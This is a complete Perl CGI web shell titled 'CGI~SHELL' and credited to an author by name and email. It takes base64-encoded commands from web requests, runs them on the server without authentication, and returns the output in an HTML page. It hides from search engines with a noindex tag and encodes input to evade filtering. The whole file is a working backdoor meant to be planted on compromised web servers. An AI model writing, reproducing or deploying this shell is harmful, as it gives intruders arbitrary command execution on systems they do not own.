#!/usr/bin/perl -I/usr/local/bandmain
use MIME::Base64;$WinNT = 0;$NTCmdSep = "&";$UnixCmdSep = ";";$CommandTimeoutDuration = 10;$ShowDynamicOutput = 1;$username = getlogin || getpwuid($<) || "alfa";$CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);$CmdPwd = ($WinNT ? "cd" : "pwd");$PathSep = ($WinNT ? "\\" : "/");$Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");sub ReadParse {local (*in) = @_ if @_;	local ($i, $loc, $key, $val);if($ENV{'REQUEST_METHOD'} eq "GET"){$in = $ENV{'QUERY_STRING'};}elsif($ENV{'REQUEST_METHOD'} eq "POST"){read(STDIN, $in, $ENV{'CONTENT_LENGTH'});}@in = split(/&/, $in);foreach $i (0 .. $#in){$in[$i] =~ s/\+/ /g;($key, $val) = split(/=/, $in[$i], 2);$key =~ s/%(..)/pack("c", hex($1))/ge;$val =~ s/%(..)/pack("c", hex($1))/ge;$in{$key} .= "\0" if (defined($in{$key}));$in{$key} .= $val;}}sub PrintPageHeader{$EncodedCurrentDir = $CurrentDir;$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;print "Content-type: text/html\n\n";print '<html><head><meta name="robots" content="noindex"><title>CGI~SHELL</title></head><body onload="document.getElementById(\'cmd\').focus();" bgcolor="#000000" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0" text="#FFFFFF"><table border="1" width="100%" cellspacing="0" cellpadding="2"><tr><font color="red"><b>Coded by sole sad & invisible ~ solevisible@gmail.com</b></font><td bgcolor="#000000" bordercolor="#FFFFFF" align="center" width="1%"><b><font size="2" color="#ff0000">#</font></b></td><td bgcolor="#000000" width="98%"><font face="Verdana" size="2"><b> <font color="#22E228"><b>Solevisible Cgi Perl</b></font> Connected to '.$ServerName.'</b></td></tr></table>';}sub PrintPageFooter{print "</font></body></html>";}sub PrintCommandLineInputForm{$Prompt = $WinNT ? "$CurrentDir> " : "[$username\@$ServerName $CurrentDir]\$ ";print '<form onsubmit="this.c.value=btoa(unescape(encodeURIComponent(this.c.value)));this.d.value=btoa(unescape(encodeURIComponent(this.d.value)));" name="f" method="POST" action="'.$ScriptLocation.'"><input type="hidden" name="d" value="'.$CurrentDir.'">'.$Prompt.'<input type="text" name="c" id="cmd" size="30"><input type="submit" value=">>"></form>';}sub CommandTimeout{if(!$WinNT){alarm(0);print "</xmp><code>Command exceeded maximum time of $CommandTimeoutDuration second(s).<br>Killed it!";&PrintCommandLineInputForm;&PrintPageFooter;exit;}}sub ExecuteCommand{if($RunCommand =~ m/^\s*cd\s+(.+)/) {$OldDir = $CurrentDir;$Command = "cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;chop($CurrentDir = `$Command`);&PrintPageHeader("c");$Prompt = $WinNT ? "$OldDir> " : "[$username\@$ServerName $OldDir]\$ ";print "$Prompt $RunCommand";}else{&PrintPageHeader("c");$Prompt = $WinNT ? "$CurrentDir> " : "[$username\@$ServerName $CurrentDir]\$ ";print "$Prompt $RunCommand<xmp>";$Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;if(!$WinNT){$SIG{'ALRM'} = \&CommandTimeout;alarm($CommandTimeoutDuration);}if($ShowDynamicOutput){$|=1;$Command .= " |";open(CommandOutput, $Command);while(<CommandOutput>){$_ =~ s/(\n|\r\n)$//;print "$_\n";}$|=0;}else{print `$Command`;}if(!$WinNT){alarm(0);}print "</xmp>";}&PrintCommandLineInputForm;&PrintPageFooter;}&ReadParse;$ScriptLocation = $ENV{'SCRIPT_NAME'};$ServerName = $ENV{'SERVER_NAME'};$RunCommand = decode_base64($in{'c'});$CurrentDir = decode_base64($in{'d'});chop($CurrentDir = `$CmdPwd`) if($CurrentDir eq "");&ExecuteCommand;
